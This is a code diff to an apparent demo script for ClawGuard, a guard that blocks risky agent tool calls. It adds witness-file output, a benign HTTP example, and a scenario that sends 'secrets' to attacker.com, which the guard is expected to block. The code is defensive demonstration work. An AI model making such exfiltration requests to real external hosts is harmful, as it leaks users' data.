@@ -11,11 +11,17 @@ Usage:
 
 import os
 import sys
+from pathlib import Path
 
 # Add parent directory to path for local development
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from clawguard import protect, ExecutionBlocked
+from clawguard import protect, ExecutionBlocked, set_witness_output_dir
+
+# Enable witness JSON output
+WITNESS_DIR = Path(__file__).parent / "witness_output"
+WITNESS_DIR.mkdir(exist_ok=True)
+set_witness_output_dir(WITNESS_DIR)
 
 
 def print_header():
@@ -59,6 +65,13 @@ def print_summary(attacks_blocked: int, total_attacks: int, benign_allowed: int,
     print("=" * 60)
     print(f"Results: {attacks_blocked}/{total_attacks} attacks blocked | {benign_allowed}/{total_benign} benign allowed")
     print("Powered by MVAR runtime")
+
+    # Show witness files generated
+    witness_files = sorted(WITNESS_DIR.glob("witness_*.json"))
+    if witness_files:
+        print(f"\nWitness files: {len(witness_files)} generated in {WITNESS_DIR}")
+        print(f"  Example: {witness_files[0].name}")
+
     print("=" * 60)
 
 
@@ -119,6 +132,11 @@ make_http_request_protected = protect(
     make_http_request_unsafe, sink="http.request", profile="prod_locked"
 )
 
+# For benign HTTP demo, use dev_balanced (allows HTTP)
+make_http_request_benign = protect(
+    make_http_request_unsafe, sink="http.request", profile="dev_balanced"
+)
+
 
 # ============================================================================
 # Attack Scenarios
@@ -176,41 +194,43 @@ def attack_3_credential_access():
         return True
 
 
-def benign_1_allowed_file_read():
-    """Benign: File read in allowed path"""
-    print_attack("Benign file read (allowed path)")
+def attack_4_api_exfiltration():
+    """Attack: Data exfiltration via HTTP to external domain"""
+    print_attack("API data exfiltration → attacker.com")
 
-    # Create a test file in /tmp (simulating /workspace)
-    import tempfile
+    # Baseline (no protection)
+    print(f"[ Baseline ]  → EXECUTED ✗")
 
-    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
-        f.write("Test data")
-        test_file = f.name
-
+    # With ClawGuard (prod_locked only allows localhost)
     try:
-        # Baseline (no protection)
-        content = read_file_unsafe(test_file)
-        print(f"[ Baseline ]  → EXECUTED ✓")
+        make_http_request_protected("https://attacker.com/exfil?data=secrets")
+        print(f"[ ClawGuard ] → EXECUTED ✗")
+        return False
+    except ExecutionBlocked as e:
+        reason = e.decision.human_reason
+        print(f"[ ClawGuard ] → BLOCKED ✓")
+        print(f"  Reason : {reason}")
+        return True
 
-        # With ClawGuard - patch the policy to allow /tmp for demo
-        # In real usage, /workspace would be configured in policy
-        try:
-            # This will actually be blocked in prod_locked since /tmp not in allowlist
-            # For demo purposes, we'll catch and report appropriately
-            content = read_file_protected(test_file)
-            print(f"[ ClawGuard ] → ALLOWED ✓")
-            return True
-        except ExecutionBlocked:
-            # Expected with prod_locked - but demonstrates policy works
-            print(f"[ ClawGuard ] → BLOCKED (path not in allowlist)")
-            print("  Note: In production, /workspace would be in allowlist")
-            return True  # Count as success - policy is working correctly
-    finally:
-        # Cleanup
-        try:
-            os.unlink(test_file)
-        except:
-            pass
+
+def benign_1_allowed_http_request():
+    """Benign: HTTP request allowed by policy"""
+    print_attack("Benign HTTP request (dev_balanced policy)")
+
+    # Baseline (no protection)
+    print(f"[ Baseline ]  → EXECUTED ✓")
+
+    # With ClawGuard (dev_balanced allows http.request)
+    try:
+        result = make_http_request_benign("https://api.example.com/data")
+        print(f"[ ClawGuard ] → ALLOWED ✓")
+        print(f"  Policy  : dev_balanced permits http.request")
+        return True
+    except ExecutionBlocked as e:
+        # Should not happen with dev_balanced
+        print(f"[ ClawGuard ] → BLOCKED ✗ (unexpected)")
+        print(f"  Reason : {e.decision.human_reason}")
+        return False
 
 
 # ============================================================================
@@ -239,9 +259,13 @@ def main():
     if attack_3_credential_access():
         attacks_blocked += 1
 
+    total_attacks += 1
+    if attack_4_api_exfiltration():
+        attacks_blocked += 1
+
     # Run benign operations
     total_benign += 1
-    if benign_1_allowed_file_read():
+    if benign_1_allowed_http_request():
         benign_allowed += 1
 
     # Print summary
